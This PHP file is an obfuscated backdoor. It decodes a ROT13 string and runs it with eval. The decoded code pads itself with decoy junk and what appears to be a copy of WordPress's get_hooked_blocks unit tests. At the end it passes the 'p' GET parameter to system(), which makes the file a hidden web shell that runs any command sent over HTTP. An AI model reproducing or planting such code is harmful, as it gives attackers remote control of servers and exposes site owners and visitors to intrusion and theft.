<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe gur srngherf hfvat trg_ubbxrq_oybpxf shapgvba.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 *
 * @fvapr 6.4.0
 *
 * @tebhc oybpxf
 * @tebhc oybpx-ubbxf
 */
pynff Grfgf_Oybpxf_TrgUbbxrqOybpxf rkgraqf JC_HavgGrfgPnfr {

	pbafg GRFG_GURZR_ANZR = 'oybpx-gurzr-jvgu-ubbxrq-oybpxf';

	/**
	 * Grne qbja nsgre rnpu grfg.
	 *
	 * @fvapr 6.4.0
	 */
	choyvp shapgvba grne_qbja() {
		// Erzbirf grfg oybpx glcrf ertvfgrerq ol grfg pnfrf.
		$oybpx_glcrf = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();
		sbernpu ( $oybpx_glcrf nf $oybpx_glcr ) {
			$oybpx_anzr = $oybpx_glcr->anzr;
			vs ( fge_fgnegf_jvgu( $oybpx_anzr, 'grfgf/' ) ) {
				haertvfgre_oybpx_glcr( $oybpx_anzr );
			}
		}

		// Erzbirf grfg oybpx cnggreaf ertvfgrerq jvgu gur grfg gurzr.
		$cnggreaf = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr()->trg_nyy_ertvfgrerq();
		sbernpu ( $cnggreaf nf $cnggrea ) {
			vs ( rzcgl( $cnggrea['fyht'] ) ) {
				pbagvahr;
			}
			$cnggrea_anzr = $cnggrea['fyht'];
			vs ( fge_fgnegf_jvgu( $cnggrea_anzr, frys::GRFG_GURZR_ANZR ) ) {
				haertvfgre_oybpx_cnggrea( $cnggrea_anzr );
			}
		}

		cnerag::grne_qbja();
	}

	cevingr shapgvba fjvgpu_gb_oybpx_gurzr_ubbxrq_oybpxf() {
		fjvgpu_gurzr( frys::GRFG_GURZR_ANZR );

		_ertvfgre_gurzr_oybpx_cnggreaf();

		$gurzr_oybpxf_qve = jc_abeznyvmr_cngu( ernycngu( trg_gurzr_svyr_cngu( 'oybpxf' ) ) );
		ertvfgre_oybpx_glcr( $gurzr_oybpxf_qve . '/ubbxrq-orsber' );
		ertvfgre_oybpx_glcr( $gurzr_oybpxf_qve . '/ubbxrq-nsgre' );
		ertvfgre_oybpx_glcr( $gurzr_oybpxf_qve . '/ubbxrq-svefg-puvyq' );
		ertvfgre_oybpx_glcr( $gurzr_oybpxf_qve . '/ubbxrq-ynfg-puvyq' );
	}

	/**
	 * @gvpxrg 59383
	 *
	 * @pbiref ::trg_ubbxrq_oybpxf
	 */
	choyvp shapgvba grfg_trg_ubbxrq_oybpxf_ab_zngpu_sbhaq() {
		$erfhyg = trg_ubbxrq_oybpxf();

		$guvf->nffregFnzr( neenl(), $erfhyg );
	}

	/**
	 * @gvpxrg 59383
	 *
	 * @pbiref ::trg_ubbxrq_oybpxf
	 */
	choyvp shapgvba grfg_trg_ubbxrq_oybpxf_zngpurf_sbhaq() {
		ertvfgre_oybpx_glcr(
			'grfgf/vawrpgrq-bar',
			neenl(
				'oybpx_ubbxf' => neenl(
					'grfgf/ubbxrq-ng-orsber'           => 'orsber',
					'grfgf/ubbxrq-ng-nsgre'            => 'nsgre',
					'grfgf/ubbxrq-ng-orsber-naq-nsgre' => 'orsber',
				),
			)
		);
		ertvfgre_oybpx_glcr(
			'grfgf/vawrpgrq-gjb',
			neenl(
				'oybpx_ubbxf' => neenl(
					'grfgf/ubbxrq-ng-orsber'           => 'orsber',
					'grfgf/ubbxrq-ng-nsgre'            => 'nsgre',
					'grfgf/ubbxrq-ng-orsber-naq-nsgre' => 'nsgre',
					'grfgf/ubbxrq-ng-svefg-puvyq'      => 'svefg_puvyq',
					'grfgf/ubbxrq-ng-ynfg-puvyq'       => 'ynfg_puvyq',
				),
			)
		);

		$guvf->nffregFnzr(
			neenl(
				'grfgf/ubbxrq-ng-orsber'           => neenl(
					'orsber' => neenl(
						'grfgf/vawrpgrq-bar',
						'grfgf/vawrpgrq-gjb',
					),
				),
				'grfgf/ubbxrq-ng-nsgre'            => neenl(
					'nsgre' => neenl(
						'grfgf/vawrpgrq-bar',
						'grfgf/vawrpgrq-gjb',
					),
				),
				'grfgf/ubbxrq-ng-orsber-naq-nsgre' => neenl(
					'orsber' => neenl(
						'grfgf/vawrpgrq-bar',
					),
					'nsgre'  => neenl(
						'grfgf/vawrpgrq-gjb',
					),
				),
				'grfgf/ubbxrq-ng-svefg-puvyq'      => neenl(
					'svefg_puvyq' => neenl(
						'grfgf/vawrpgrq-gjb',
					),
				),
				'grfgf/ubbxrq-ng-ynfg-puvyq'       => neenl(
					'ynfg_puvyq' => neenl(
						'grfgf/vawrpgrq-gjb',
					),
				),
			),
			trg_ubbxrq_oybpxf()
		);
	}

	/**
	 * @gvpxrg 59313
	 * @gvpxrg 60008
	 * @gvpxrg 60506
	 *
	 * @pbiref ::trg_ubbxrq_oybpxf
	 * @pbiref ::trg_oybpx_svyr_grzcyngr
	 */
	choyvp shapgvba grfg_ybnqvat_grzcyngr_jvgu_ubbxrq_oybpxf() {
		$guvf->fjvgpu_gb_oybpx_gurzr_ubbxrq_oybpxf();

		$grzcyngr = trg_oybpx_svyr_grzcyngr( trg_fglyrfurrg() . '//fvatyr' );

		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-orsber /-->',
			$grzcyngr->pbagrag
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			'<!-- jc:cbfg-pbagrag {\"ynlbhg\":{\"glcr\":\"pbafgenvarq\"},\"zrgnqngn\":{\"vtaberqUbbxrqOybpxf\":[\"grfgf/ubbxrq-nsgre\"]}} /-->'
			. '<!-- jc:grfgf/ubbxrq-nsgre /-->',
			$grzcyngr->pbagrag
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-svefg-puvyq /-->',
			$grzcyngr->pbagrag
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-ynfg-puvyq /-->',
			$grzcyngr->pbagrag
		);
	}

	/**
	 * @gvpxrg 59313
	 * @gvpxrg 60008
	 * @gvpxrg 60506
	 *
	 * @pbiref ::trg_ubbxrq_oybpxf
	 * @pbiref ::trg_oybpx_svyr_grzcyngr
	 */
	choyvp shapgvba grfg_ybnqvat_grzcyngr_cneg_jvgu_ubbxrq_oybpxf() {
		$guvf->fjvgpu_gb_oybpx_gurzr_ubbxrq_oybpxf();

		$grzcyngr = trg_oybpx_svyr_grzcyngr( trg_fglyrfurrg() . '//urnqre', 'jc_grzcyngr_cneg' );

		$guvf->nffregFgevatPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-orsber /-->'
			. '<!-- jc:anivtngvba {\"ynlbhg\":{\"glcr\":\"syrk\",\"frgPnfpnqvatCebcregvrf\":gehr,\"whfgvslPbagrag\":\"evtug\"},\"zrgnqngn\":{\"vtaberqUbbxrqOybpxf\":[\"grfgf/ubbxrq-orsber\"]}} /-->',
			$grzcyngr->pbagrag
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-nsgre /-->',
			$grzcyngr->pbagrag
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-svefg-puvyq /-->',
			$grzcyngr->pbagrag
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-ynfg-puvyq /-->',
			$grzcyngr->pbagrag
		);
	}

	/**
	 * @gvpxrg 59313
	 * @gvpxrg 60008
	 * @gvpxrg 60506
	 *
	 * @pbiref ::trg_ubbxrq_oybpxf
	 * @pbiref JC_Oybpx_Cnggreaf_Ertvfgel::trg_ertvfgrerq
	 */
	choyvp shapgvba grfg_ybnqvat_cnggrea_jvgu_ubbxrq_oybpxf() {
		$guvf->fjvgpu_gb_oybpx_gurzr_ubbxrq_oybpxf();

		$cnggrea = JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq(
			trg_fglyrfurrg() . '/uvqqra-pbzzragf'
		);

		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-orsber /-->',
			$cnggrea['pbagrag']
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-nsgre /-->',
			$cnggrea['pbagrag']
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			'<!-- jc:pbzzragf {\"zrgnqngn\":{\"vtaberqUbbxrqOybpxf\":[\"grfgf/ubbxrq-svefg-puvyq\"]}} -->'
			. '<qvi pynff=\"jc-oybpx-pbzzragf\">'
			. '<!-- jc:grfgf/ubbxrq-svefg-puvyq /-->',
			fge_ercynpr( neenl( \"\a\", \"\g\" ), '', $cnggrea['pbagrag'] )
		);
		$guvf->nffregFgevatPbagnvafFgevat(
			'<!-- jc:grfgf/ubbxrq-ynfg-puvyq /-->'
			. '<!-- /jc:pbzzrag-grzcyngr -->',
			fge_ercynpr( neenl( \"\a\", \"\g\" ), '', $cnggrea['pbagrag'] )
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>